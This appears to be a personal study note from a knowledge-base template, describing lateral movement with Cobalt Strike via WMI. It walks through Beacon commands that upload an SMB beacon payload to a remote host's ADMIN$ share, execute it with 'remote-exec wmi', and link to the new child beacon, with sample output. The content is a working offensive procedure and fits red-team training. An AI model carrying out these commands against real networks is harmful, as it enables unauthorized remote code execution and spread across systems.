---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[WMI (Windows Management Instrumentation)]]  
___

## Description:  
For Lateral Movement in Cobalt Strike

The `remote-exec` method uses WMI's "process call create" to execute any command we specify on the target. The most straight forward means of using this is to upload a payload to the target system and use WMI to execute it.

Generate an x64 Windows EXE for the SMB listener, upload it to the target by `cd`'ing to the desired UNC path and then use the `upload` command.

```
beacon> cd \\srv-1\ADMIN$
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
Started process 536 on srv-1
```

The process is now running on SRV-1 so now we need to connect to it.
```
beacon> link srv-1
[+] established link to child beacon: 10.10.17.25
```



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (04:03 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
